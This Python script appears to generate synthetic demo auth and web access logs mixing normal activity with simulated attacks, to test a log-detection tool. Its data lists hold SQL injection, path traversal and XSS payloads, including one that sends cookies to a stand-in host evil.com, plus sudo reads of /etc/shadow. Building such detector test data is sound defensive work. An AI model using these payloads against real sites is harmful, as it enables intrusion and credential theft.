"""Generate realistic demo log files with embedded attack patterns.

Produces auth.log and access.log with a mix of normal activity and
attack scenarios that trigger SentryLog detection rules.

Attack scenarios embedded:
1. SSH brute force from attacker IP → eventual success (credential stuffing)
2. User enumeration with invalid usernames
3. Privilege escalation: sudo to root shell + shadow file read
4. Web scanner probing common paths
5. SQL injection attempts
6. XSS and path traversal attacks
7. Normal baseline traffic for realistic signal-to-noise ratio
"""

from __future__ import annotations

import logging
import random
from datetime import datetime, timedelta
from pathlib import Path

log = logging.getLogger(__name__)

# --- Config ---
BASE_DATE = datetime(2025, 6, 15, 0, 0, 0)
DURATION_HOURS = 24

INTERNAL_IPS = ["192.168.1.10", "192.168.1.20", "192.168.1.30", "10.0.0.50", "10.0.0.100"]
ATTACKER_IPS = ["203.0.113.42", "198.51.100.77", "185.220.101.33"]
LEGIT_USERS = ["alice", "bob", "deploy", "webadmin"]
BRUTE_USERS = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "pi", "guest", "ftpuser"]
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "curl/7.88.1",
]
SCANNER_UAS = [
    "sqlmap/1.7.12",
    "Nikto/2.5.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "DirBuster-1.0-RC1",
]
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/api/status",
    "/css/style.css", "/js/app.js", "/images/logo.png", "/favicon.ico",
    "/blog", "/blog/post-1", "/blog/post-2", "/docs", "/login", "/dashboard",
]
SCANNER_PATHS = [
    "/wp-admin/", "/wp-login.php", "/phpmyadmin/", "/admin/", "/.env",
    "/xmlrpc.php", "/config.php", "/shell.php", "/manager/html",
    "/solr/admin/", "/actuator/health", "/.git/config", "/backup.sql",
    "/wp-content/uploads/", "/cgi-bin/", "/server-status",
]
SQLI_PATHS = [
    "/search?q=1'+OR+1=1--",
    "/search?q=1+UNION+SELECT+username,password+FROM+users--",
    "/page?id=1;DROP+TABLE+users--",
    "/api/user?id=1'+AND+1=CONVERT(int,(SELECT+TOP+1+table_name+FROM+information_schema.tables))--",
    "/login?user=admin'--&pass=x",
]
XSS_PATHS = [
    "/page?q=<script>alert(document.cookie)</script>",
    "/search?q=<img+src=x+onerror=alert(1)>",
    "/comment?body=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
]
TRAVERSAL_PATHS = [
    "/../../etc/passwd",
    "/../../etc/shadow",
    "/static/../../../../../../etc/hosts",
]


def _ts_auth(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def _ts_apache(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S -0500")


def _rand_port() -> int:
    return random.randint(30000, 65000)


class DemoLogGenerator:
    def __init__(self, base_date: datetime = BASE_DATE, hours: int = DURATION_HOURS):
        self.base = base_date
        self.end = base_date + timedelta(hours=hours)
        self.auth_lines: list[tuple[datetime, str]] = []
        self.access_lines: list[tuple[datetime, str]] = []

    def _rand_time(self, start: datetime, window_minutes: int = 5) -> datetime:
        offset = random.randint(0, window_minutes * 60)
        return start + timedelta(seconds=offset)

    # --- Auth log generators ---

    def gen_normal_ssh(self):
        """Normal SSH logins throughout the day."""
        for hour in range(0, 24, 2):
            t = self.base + timedelta(hours=hour, minutes=random.randint(0, 59))
            user = random.choice(LEGIT_USERS)
            ip = random.choice(INTERNAL_IPS)
            pid = random.randint(1000, 30000)
            self.auth_lines.append((t, f"{_ts_auth(t)} webserver sshd[{pid}]: Accepted publickey for {user} from {ip} port {_rand_port()} ssh2"))
            self.auth_lines.append((t + timedelta(seconds=1), f"{_ts_auth(t + timedelta(seconds=1))} webserver sshd[{pid}]: pam_unix(sshd:session): session opened for user {user}"))
            # Session close later
            close_t = t + timedelta(minutes=random.randint(10, 120))
            self.auth_lines.append((close_t, f"{_ts_auth(close_t)} webserver sshd[{pid}]: pam_unix(sshd:session): session closed for user {user}"))

    def gen_normal_sudo(self):
        """Legitimate sudo usage."""
        for _ in range(8):
            t = self.base + timedelta(hours=random.randint(8, 18), minutes=random.randint(0, 59))
            user = random.choice(["deploy", "webadmin"])
            cmds = [
                "/usr/bin/systemctl restart nginx",
                "/usr/bin/systemctl status postgresql",
                "/usr/bin/apt update",
                "/usr/bin/journalctl -u nginx --since today",
                "/usr/bin/tail -100 /var/log/syslog",
            ]
            cmd = random.choice(cmds)
            self.auth_lines.append((t, f"{_ts_auth(t)} webserver sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"))

    def gen_brute_force_attack(self):
        """SSH brute force attack: rapid failed logins then success."""
        attacker = ATTACKER_IPS[0]
        start = self.base + timedelta(hours=3, minutes=15)
        pid_base = random.randint(20000, 25000)

        # 15 failed attempts over ~2 minutes
        for i in range(15):
            t = start + timedelta(seconds=i * 8 + random.randint(0, 3))
            user = random.choice(BRUTE_USERS)
            pid = pid_base + i
            self.auth_lines.append((t, f"{_ts_auth(t)} webserver sshd[{pid}]: Invalid user {user} from {attacker}"))
            self.auth_lines.append((t + timedelta(seconds=1), f"{_ts_auth(t + timedelta(seconds=1))} webserver sshd[{pid}]: Failed password for invalid user {user} from {attacker} port {_rand_port()} ssh2"))

        # Successful login after brute force
        success_t = start + timedelta(minutes=3)
        pid = pid_base + 20
        self.auth_lines.append((success_t, f"{_ts_auth(success_t)} webserver sshd[{pid}]: Accepted password for root from {attacker} port {_rand_port()} ssh2"))
        self.auth_lines.append((success_t + timedelta(seconds=1), f"{_ts_auth(success_t + timedelta(seconds=1))} webserver sshd[{pid}]: pam_unix(sshd:session): session opened for user root"))

    def gen_user_enumeration(self):
        """Second attacker doing user enumeration."""
        attacker = ATTACKER_IPS[1]
        start = self.base + timedelta(hours=7, minutes=42)
        for i, user in enumerate(BRUTE_USERS):
            t = start + timedelta(seconds=i * 3)
            pid = random.randint(26000, 27000)
            self.auth_lines.append((t, f"{_ts_auth(t)} webserver sshd[{pid}]: Invalid user {user} from {attacker}"))
            self.auth_lines.append((t + timedelta(seconds=1), f"{_ts_auth(t + timedelta(seconds=1))} webserver sshd[{pid}]: Failed password for invalid user {user} from {attacker} port {_rand_port()} ssh2"))

    def gen_privilege_escalation(self):
        """Attacker escalates privileges after compromising account."""
        t1 = self.base + timedelta(hours=3, minutes=25)
        # sudo to root shell
        self.auth_lines.append((t1, f"{_ts_auth(t1)} webserver sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash"))
        # Read shadow file
        t2 = t1 + timedelta(minutes=2)
        self.auth_lines.append((t2, f"{_ts_auth(t2)} webserver sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"))
        # Read sudoers
        t3 = t2 + timedelta(seconds=30)
        self.auth_lines.append((t3, f"{_ts_auth(t3)} webserver sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/sudoers"))

    # --- Access log generators ---

    def gen_normal_web_traffic(self):
        """Normal web browsing throughout the day."""
        for _ in range(200):
            t = self.base + timedelta(
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59),
            )
            ip = random.choice(INTERNAL_IPS + ["172.16.0." + str(random.randint(1, 50))])
            path = random.choice(NORMAL_PATHS)
            method = "GET"
            status = random.choice([200, 200, 200, 200, 200, 304, 301])
            size = random.randint(500, 50000)
            ua = random.choice(USER_AGENTS)
            user = random.choice(["-", "-", "-", random.choice(LEGIT_USERS)])
            ref = random.choice(["-", "http://example.com/", "http://example.com/blog"])
            self.access_lines.append((t,
                f'{ip} - {user} [{_ts_apache(t)}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'
            ))

    def gen_scanner_attack(self):
        """Web scanner probing for common vulnerabilities."""
        attacker = ATTACKER_IPS[1]
        ua = random.choice(SCANNER_UAS)
        start = self.base + timedelta(hours=11, minutes=5)

        for i, path in enumerate(SCANNER_PATHS):
            t = start + timedelta(seconds=i * 2 + random.randint(0, 1))
            status = random.choice([404, 404, 403, 404])
            self.access_lines.append((t,
                f'{attacker} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" {status} 0 "-" "{ua}"'
            ))

    def gen_recon_before_exploit(self):
        """Recon probing from the same IP that later does SQLi/XSS (triggers correlation)."""
        attacker = ATTACKER_IPS[2]  # same IP as SQLi/XSS attacker
        start = self.base + timedelta(hours=14, minutes=10)
        recon_paths = ["/wp-admin/", "/.env", "/phpmyadmin/", "/admin/", "/.git/config"]
        for i, path in enumerate(recon_paths):
            t = start + timedelta(seconds=i * 3)
            self.access_lines.append((t,
                f'{attacker} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"'
            ))

    def gen_sqli_attack(self):
        """SQL injection attempts."""
        attacker = ATTACKER_IPS[2]
        start = self.base + timedelta(hours=14, minutes=30)

        for i, path in enumerate(SQLI_PATHS):
            t = start + timedelta(seconds=i * 5)
            status = random.choice([200, 500, 200])
            self.access_lines.append((t,
                f'{attacker} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" {status} {random.randint(0, 5000)} "-" "sqlmap/1.7.12"'
            ))

    def gen_xss_attack(self):
        """XSS attempts."""
        attacker = ATTACKER_IPS[2]
        start = self.base + timedelta(hours=14, minutes=35)

        for i, path in enumerate(XSS_PATHS):
            t = start + timedelta(seconds=i * 3)
            self.access_lines.append((t,
                f'{attacker} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" 200 0 "-" "Nikto/2.5.0"'
            ))

    def gen_traversal_attack(self):
        """Path traversal attempts."""
        attacker = ATTACKER_IPS[2]
        start = self.base + timedelta(hours=14, minutes=38)

        for i, path in enumerate(TRAVERSAL_PATHS):
            t = start + timedelta(seconds=i * 2)
            self.access_lines.append((t,
                f'{attacker} - - [{_ts_apache(t)}] "GET {path} HTTP/1.1" 403 0 "-" "Nikto/2.5.0"'
            ))

    def gen_post_compromise_web(self):
        """Attacker accessing admin panel after compromise."""
        attacker = ATTACKER_IPS[0]
        start = self.base + timedelta(hours=3, minutes=30)

        paths = ["/admin/", "/admin/config", "/admin/users", "/admin/export"]
        for i, path in enumerate(paths):
            t = start + timedelta(seconds=i * 10)
            self.access_lines.append((t,
                f'{attacker} - root [{_ts_apache(t)}] "GET {path} HTTP/1.1" 200 {random.randint(1000, 5000)} "-" "Mozilla/5.0"'
            ))

    def generate(self) -> tuple[str, str]:
        """Generate all logs and return (auth_log_content, access_log_content)."""
        # Normal activity
        self.gen_normal_ssh()
        self.gen_normal_sudo()
        self.gen_normal_web_traffic()

        # Attack scenarios
        self.gen_brute_force_attack()
        self.gen_user_enumeration()
        self.gen_privilege_escalation()
        self.gen_scanner_attack()
        self.gen_recon_before_exploit()
        self.gen_sqli_attack()
        self.gen_xss_attack()
        self.gen_traversal_attack()
        self.gen_post_compromise_web()

        # Sort by timestamp
        self.auth_lines.sort(key=lambda x: x[0])
        self.access_lines.sort(key=lambda x: x[0])

        auth_content = "\n".join(line for _, line in self.auth_lines) + "\n"
        access_content = "\n".join(line for _, line in self.access_lines) + "\n"

        return auth_content, access_content

    def write(self, output_dir: Path) -> tuple[Path, Path]:
        """Generate and write log files."""
        output_dir.mkdir(parents=True, exist_ok=True)
        auth_content, access_content = self.generate()

        auth_path = output_dir / "demo_auth.log"
        access_path = output_dir / "demo_access.log"

        auth_path.write_text(auth_content)
        access_path.write_text(access_content)

        log.info("Wrote demo logs: %d auth lines, %d access lines to %s",
                 len(self.auth_lines), len(self.access_lines), output_dir)
        return auth_path, access_path


def generate_demo_logs(output_dir: Path | None = None) -> tuple[Path, Path]:
    """Generate demo logs and return paths."""
    if output_dir is None:
        output_dir = Path("data/sample_logs")
    gen = DemoLogGenerator()
    return gen.write(output_dir)


if __name__ == "__main__":
    auth_path, access_path = generate_demo_logs()
    print(f"Generated {auth_path} and {access_path}")
